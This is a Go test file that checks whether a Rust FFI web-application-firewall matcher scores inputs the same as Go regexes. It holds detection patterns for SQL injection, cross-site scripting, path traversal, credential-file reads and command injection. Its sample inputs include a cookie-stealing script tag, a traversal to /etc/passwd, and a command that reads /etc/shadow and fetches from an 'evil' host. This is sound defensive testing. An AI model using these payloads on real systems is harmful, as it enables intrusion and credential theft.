//go:build linux

package rustffi

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"
)

// resolveSO walks up from cwd to find the built Rust cdylib and points
// GS_WAF_LIB at it so the FFI loads during `go test`.
func resolveSO() {
	if os.Getenv("GS_WAF_LIB") != "" {
		return
	}
	dir, _ := os.Getwd()
	for i := 0; i < 8; i++ {
		cand := filepath.Join(dir, "rust", "wafmatcher", "target", "release", "libwafmatcher.so")
		if _, err := os.Stat(cand); err == nil {
			os.Setenv("GS_WAF_LIB", cand)
			return
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return
		}
		dir = parent
	}
}

func TestMain(m *testing.M) {
	resolveSO()
	os.Exit(m.Run())
}

// Same corpus as the Windows parity test: patterns already carry (?i),
// identical to what Rust compiles.
var (
	benchPatterns = []string{
		`(?i)(\bSELECT\b.{0,40}\bFROM\b|\bUNION\b.{0,40}\bSELECT\b|\bINSERT\b.{0,40}\bINTO\b)`,
		`(?i)('|")\s*(OR|AND)\s*('|")\s*(=|LIKE)`,
		`(?i)admin'\s*--\s*|1'\s*OR\s*'1'\s*=\s*'1`,
		`(?i)<script[\s>]`,
		`(?i)javascript\s*:`,
		`(?i)onerror\s*=|onload\s*=|onclick\s*=`,
		`(?i)<iframe[\s>]|<embed[\s>]|<object[\s>]`,
		`(?i)\.\./\.\./|\.\.\\.\.\\|%2e%2e%2f`,
		`(?i)/etc/passwd|/etc/shadow|/etc/hosts`,
		`(?i)[|;&$` + "`" + `]\s*(?:id|whoami|pwd|ls|cat|rm|wget|curl)\b`,
	}
	benchScores = []int32{50, 45, 50, 50, 40, 40, 45, 45, 50, 50}
)

var benchInputs = []string{
	"GET /index.html HTTP/1.1",
	"q=1' OR '1'='1",
	"<script>alert(document.cookie)</script>",
	"../../../../etc/passwd",
	"cat /etc/shadow; wget http://evil/x",
	"SELECT * FROM users WHERE id=1",
	"normal search query about cats",
	"POST /login username=admin&pw=secret",
}

func goScore(patterns []string, scores []int32, input string) int {
	total := 0
	for i, p := range patterns {
		re := regexp.MustCompile(p)
		if re.MatchString(input) {
			total += int(scores[i])
		}
	}
	return total
}

func TestParityWithGo(t *testing.T) {
	if !Available() {
		t.Skip("libwafmatcher.so not available")
	}
	m, err := New(benchPatterns, benchScores)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	defer m.Close()
	if c := m.Count(); c != len(benchPatterns) {
		t.Fatalf("rule count = %d, want %d", c, len(benchPatterns))
	}
	for _, in := range benchInputs {
		got := m.Score(in)
		want := goScore(benchPatterns, benchScores, in)
		if got != want {
			t.Errorf("input %q: rust=%d go=%d", in, got, want)
		}
	}
}
